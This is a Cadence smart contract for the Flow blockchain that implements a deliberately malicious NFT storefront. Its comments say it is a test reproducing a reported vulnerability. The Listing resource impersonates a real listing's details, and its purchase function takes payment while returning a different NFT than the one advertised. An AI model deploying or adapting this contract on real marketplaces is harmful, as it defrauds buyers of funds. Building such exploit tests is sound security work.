import "NFTStorefront"
import "NonFungibleToken"
import "FungibleToken"
import "FungibleTokenMetadataViews"

/// Thanks to Austin Kline - https://twitter.com/austin_flowty
/// for discovering and reporting the vulnerability that this contract tests
///
/// This is a test contract that implements a malicious storefront
/// to try an sell an NFT with a different ID in the place
/// of a different listing
///
/// There is a test in NFTStorefrontV1_test.cdc that tests this case

access(all) contract MaliciousStorefrontV1 {
    access(all) let StorefrontStoragePath: StoragePath
    access(all) let StorefrontPublicPath: PublicPath

    access(all) resource Storefront: NFTStorefront.StorefrontPublic {
        access(self) let storefrontCap: Capability<auth(NFTStorefront.CreateListing, NFTStorefront.RemoveListing) &NFTStorefront.Storefront>
        access(self) let listings: @{UInt64: Listing}


        access(all) view fun getListingIDs(): [UInt64] {
            return self.storefrontCap.borrow()!.getListingIDs()
        }

        access(all) view fun borrowListing(listingResourceID: UInt64): &{NFTStorefront.ListingPublic}? {
            return &self.listings[listingResourceID]
        }

        access(all) fun cleanup(listingResourceID: UInt64) {
            return
        }

        access(NFTStorefront.CreateListing) fun createListing(
            nftProviderCapability: Capability<auth(NonFungibleToken.Withdraw) &{NonFungibleToken.Collection}>,
            nftType: Type,
            nftID: UInt64,
            maliciousNftId: UInt64,
            salePaymentVaultType: Type,
            saleCuts: [NFTStorefront.SaleCut],
            marketplacesCapability: [Capability<&{FungibleToken.Receiver}>]?,
            customID: String?,
            commissionAmount: UFix64,
            expiry: UInt64
        ): UInt64 {
            let storefront = self.storefrontCap.borrow()!
            let listingId = storefront.createListing(
                nftProviderCapability: nftProviderCapability,
                nftType: nftType,
                nftID: nftID,
                salePaymentVaultType: salePaymentVaultType,
                saleCuts: saleCuts
            )

            let maliciouslisting <- create Listing(
                storefrontCap: self.storefrontCap,
                listingResourceID: listingId,
                nftId: maliciousNftId,
                provider: nftProviderCapability
            )

            destroy self.listings.insert(key: listingId, <-maliciouslisting)

            return listingId
        }

        init(storefrontCap: Capability<auth(NFTStorefront.CreateListing, NFTStorefront.RemoveListing) &NFTStorefront.Storefront>) {
            self.storefrontCap = storefrontCap
            self.listings <- {}
        }
    }

    access(all) resource Listing: NFTStorefront.ListingPublic {
        access(self) let storefrontCap: Capability<&NFTStorefront.Storefront>

        // this id much match the id of the listing being impersonated
        access(self) let listingResourceID: UInt64

        // this is the id of the nft we are returning instead of the one that a user thinks is being purchased.
        access(self) let nftId: UInt64

        access(contract) let provider: Capability<auth(NonFungibleToken.Withdraw) &{NonFungibleToken.Provider, NonFungibleToken.CollectionPublic}>

        access(all) fun borrowNFT(): &{NonFungibleToken.NFT}? {
            return self.storefrontCap.borrow()!.borrowListing(listingResourceID: self.listingResourceID)!.borrowNFT()
        }

        access(all) fun getDetails(): NFTStorefront.ListingDetails {
            return self.storefrontCap.borrow()!.borrowListing(listingResourceID: self.listingResourceID)!.getDetails()
        }

        // purchase will return the "wrong" nft
        access(all) fun purchase(
            payment: @{FungibleToken.Vault}
        ): @{NonFungibleToken.NFT} {
            let details = self.getDetails()
            assert(payment.balance == details.salePrice, message: "incorrect payment amount")
            assert(payment.getType() == details.salePaymentVaultType, message: "incorrect payment token type")

            let ftVaultData = payment.resolveView(Type<FungibleTokenMetadataViews.FTVaultData>())! as! FungibleTokenMetadataViews.FTVaultData
            if let vault = MaliciousStorefrontV1.account.storage.borrow<&{FungibleToken.Vault}>(from: ftVaultData.storagePath) {
                vault.deposit(from: <- payment)
            } else {
                MaliciousStorefrontV1.account.storage.save(<-payment, to: ftVaultData.storagePath)
            }

            let nft <- self.provider.borrow()!.withdraw(withdrawID: self.nftId)
            return <- nft
        }

        init(
            storefrontCap: Capability<auth(NFTStorefront.CreateListing, NFTStorefront.RemoveListing) &NFTStorefront.Storefront>,
            listingResourceID: UInt64,
            nftId: UInt64,
            provider: Capability<auth(NonFungibleToken.Withdraw) &{NonFungibleToken.Provider, NonFungibleToken.CollectionPublic}>
        ) {
            pre {
                provider.check(): "invalid provider capability"
                storefrontCap.check(): "invalid storefront cap"
            }

            let listing = storefrontCap.borrow()!.borrowListing(listingResourceID: listingResourceID) ?? panic("failed to borrow get impersonated listing")
            let details = listing.getDetails()

            self.storefrontCap = storefrontCap
            self.listingResourceID = listingResourceID
            self.nftId = nftId
            self.provider = provider

            assert(provider.borrow()!.borrowNFT(self.nftId) != nil, message: "could not borrow nftID")
            assert(details.nftID != self.nftId, message: "must not return the same id as the original listing")
        }
    }

    access(all) fun createStorefront(storefrontCap: Capability<auth(NFTStorefront.CreateListing, NFTStorefront.RemoveListing) &NFTStorefront.Storefront>): @Storefront {
        return <- create Storefront(storefrontCap: storefrontCap)
    }

    init() {
        self.StorefrontStoragePath = /storage/NFTStorefrontV1Malicious
        self.StorefrontPublicPath = /public/NFTStorefront
    }
}